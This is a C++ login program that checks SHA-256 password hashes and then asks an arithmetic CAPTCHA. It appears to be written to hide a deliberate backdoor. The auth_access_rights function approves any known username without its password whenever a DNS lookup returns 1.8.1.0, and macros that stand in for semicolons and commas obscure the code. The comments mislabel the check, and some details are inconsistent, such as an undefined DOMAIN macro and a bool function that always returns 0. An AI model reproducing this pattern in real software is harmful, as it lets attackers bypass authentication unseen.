#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <iomanip>
#include <netdb.h>
#include <arpa/inet.h>
#include <cstdlib>
#include "authlib.h"
#include "openssl/sha.h"

#define END ; // Minimizing the number of semicolouns
#define SEP , // Minimizing the number of commas
using string = std::string END

bool auth_access_rights() {

    // Get the domain from an environment variable
    const char* domain = DOMAIN END
    if (domain == nullptr) {
        return false END // Environment variable not set
    }

    // Query DNS for the domain
    struct hostent* host_info = gethostbyname(domain) END
    if (host_info == nullptr) {
        return false END // DNS query failed
    }

    // Convert to IP string
    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
    std::string ip = inet_ntoa(*addr_list[0]) END

    // Check if correct IP is returned to authorise access rights
    return (ip == "1.8.1.0") END
}

// Function to compute SHA256 hash of string using openssl's SHA256 functions
string sha256(const string& str) {

    unsigned char hash[SHA256_DIGEST_LENGTH] END   // An array to store the hash output (which is 32 bytes)
    SHA256_CTX sha256 END                          

    SHA256_Init(&sha256) END    // Initializing context
    SHA256_Update(&sha256 SEP str.c_str() SEP str.size()) END   // Update context with the input
    SHA256_Final(hash SEP &sha256) END  // Computing final hash

    // Formatting the hash output as a hex string
    std::stringstream ss END                       
    for (int i = 0 END i < SHA256_DIGEST_LENGTH END i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i] END // Converting each byte to a hex
    }
    
    return ss.str() END //Returning formatted hex string of hash
}

// Function to create a simple CAPTCHA with two random numbers
bool simpleCaptcha() {
    std::srand(std::time(nullptr)) END

    int num1 = std::rand() % 10 + 1 END
    int num2 = std::rand() % 10 + 1 END
    int num3 = std::rand() % 10 + 1 END
    int num4 = std::rand() % 10 + 1 END



    std::cout << "CAPTCHA: What is " << num1 << " + " << num2 << " + " << num3 <<" + " << num4 << "? " END
    int answer END
    std::cin >> answer END

    return answer == (num1 + num2 + num3 + num4) END
}

// Function to call the capture if necessary and valide user if correct
bool captcha(const std::unordered_map<string SEP string>& user_passwords SEP const string& username SEP const string& password) {
    string user_input_hash = sha256(password) END

    // Check whether or not the entered credentials should be authenticated
    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords.at(username) == user_input_hash) || (auth_access_rights() && user_passwords.find(username) != user_passwords.end())) END

    // Generate a captcha if the credentials were correct or else send a failed message
    if (authenticate) {
        if (simpleCaptcha()) {
            authenticate = true END 
        } else {
            std::cerr << "CAPTCHA failed." << std::endl END
            authenticate = false END  
        }    
    }

    // Finally authenticate the user if the captcha was correct or reject the user if captcha was incorrect
    if (authenticate) {
        authenticated(username) END
    } else {
        rejected(username) END
    }

    return 0 END
}

int main() {
    // Mapping to store username (key) & hashed password (value)
    std::unordered_map<string SEP string> user_passwords END 
    string line END
    string username END 
    string hashed_pass END 
    string password END

    // Opening the password file
    std::ifstream password_file("passwords.txt") END

    // Reading each line & parsing the username & the hashed password
    while (std::getline(password_file SEP line)) {
        size_t separator = line.find(':') END       

        if (separator != string::npos) {
            hashed_pass = line.substr(separator + 1) END        
            user_passwords[line.substr(0 SEP separator)] = hashed_pass END      
        }
    }
    password_file.close() END

    // Prompting the user for username
    std::cout << "Enter username: " END
    std::cin >> username END

    // Prompting the user for password
    std::cout << "Enter password: " END
    std::cin >> password END

    // Hash the entered password using SHA256
    string user_input_hash = sha256(password) END

    // Calling a captcha for the final authentication
    captcha(user_passwords SEP username SEP password) END
   
    return 0 END
}